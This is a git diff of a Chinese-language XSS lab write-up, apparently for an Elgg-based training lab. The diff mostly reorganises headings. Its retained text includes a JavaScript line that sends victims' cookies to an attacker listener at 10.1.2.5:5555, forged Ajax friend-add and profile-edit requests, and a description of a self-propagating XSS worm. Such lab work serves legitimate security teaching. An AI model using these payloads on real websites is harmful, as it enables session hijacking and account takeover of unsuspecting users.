@@ -1,5 +1,7 @@
 # Cross-Site Scripting Attack
 
+## Pre-Experiment
+
 Cross-site scripting (XSS) 跨站脚本攻击. 
 
 在缺乏对危险内容 (恶意代码片段等) 过滤的网站中, 可能存在恶意用户提交危险内容, 当正常用户浏览访问危险内容的时候, 自己的网页会被危险内容篡改. 
@@ -14,21 +16,19 @@ Cross-site scripting 的英文首字母缩写本应为CSS, 但是吧, 所以将 
 
 [wiki](https://zh.wikipedia.org/wiki/跨網站指令碼)
 
-## 预备知识
+
 - HTTP 
 - JavaScript
 - Ajax
 
-## 实验环境
+
 在下载的 Ubuntu 中包含了一个名为 Elgg 的 Web 应用, 它在路径 `/var/www/XSS/Elgg/` 下, 本地浏览器访问 `http://www.xsslabelgg.com`, 实验指导中给出了相应的用户信息. 
 
 为了方便测试, 可以打开两个虚拟机方便登上两个不同账号, 相互访问吗, 配置其中一个虚拟机的 `/etc/hosts` 将 `127.0.0.1` 修改为另一个虚拟机的 IP. 
 
 <!-- 此外, 使用 `console.log` 来代替 `alert` 可能更好的体验.  -->
 
-## 实验任务
-
-### T1 Posting a Malicious Message to Display an Alert Window
+## T1 Posting a Malicious Message to Display an Alert Window
 
 某个用户在自己的 profile 页面中输入一段 JS 片段, 其他用户访问此用户的 profile 页面时, JS 片段会被自动加载执行. 
 
@@ -39,7 +39,7 @@ Cross-site scripting 的英文首字母缩写本应为CSS, 但是吧, 所以将 
 实验指导中的单引号是非法字符. 
 :::
 
-### T2 Posting a Malicious Message to Display Cookies
+## T2 Posting a Malicious Message to Display Cookies
 
 在 T1 的基础上将单纯的 `alert` 修改为能够获取访问用户的 Cookies 的 JS 片段. 
 
@@ -49,7 +49,7 @@ Cross-site scripting 的英文首字母缩写本应为CSS, 但是吧, 所以将 
 
 还可以获取其他需要的有价值数据. 
 
-### T3 Stealing Cookies from the Victim’s Machine
+## T3 Stealing Cookies from the Victim’s Machine
 
 在 T2 中, 我们能够获取访问用户的 Cookies 数据, 但是作为攻击者, 这些数据是看不到的, 所以, 我们希望在获取数据之后直接发送给攻击者
 
@@ -65,7 +65,7 @@ document.write('<img src = http://10.1.2.5:5555?c=' + escape(document.cookie) + 
 ```
 利用 `img` 标签, 受害者在获取 "图片" 时会自动发送不该发送的数据. 
 
-### T4 Becoming the Victim’s Friend
+## T4 Becoming the Victim’s Friend
 
 让受害者直接添加攻击者为好友. 这里会用到很有年代感的 Ajax. 
 
@@ -101,7 +101,7 @@ http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1580819905&__el
 
 例如 Alice 访问 Samy 的 profile 页面, 再到自己的 friend 页面中, 就会发现 "好友" Samy. 
 
-### T5 Modifying the Victim’s Profile
+## T5 Modifying the Victim’s Profile
 
 修改受害者的 profile, 和 T4 对应, 这里需要用 Ajax 发送一个 POST 请求. 
 
@@ -141,7 +141,7 @@ http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1580819905&__el
 
 17 行的 if 判断是为了防止 Samy 自己被自己攻击. 
 
-### T6 Writing a Self-Propagating XSS Worm
+## T6 Writing a Self-Propagating XSS Worm
 
 编写 XSS 蠕虫加速传播. 我们需要让用户访问攻击者 profile 时, 自动加载运行危险的 JS 代码, 这段代码会修改访问者的 profile 并使其成为攻击者.  
 
@@ -165,7 +165,7 @@ Samy 自己的 profile 页面内的 description 也添加那段短短的 HTML �
 
 这时候, 让 Alice 访问 Samy, 他的 profile 会被修改, 同时他也具备了攻击他人的能力, 当 Boby 访问 Alice 主页的时候, 他的 profile 也会被修改也会成为一个新的攻击者. 
 
-### T7 Countermeasures
+## T7 Countermeasures
 实验项目自带了安全措施, 照做. Why
 
 ## 防御 XSS 攻击的建议
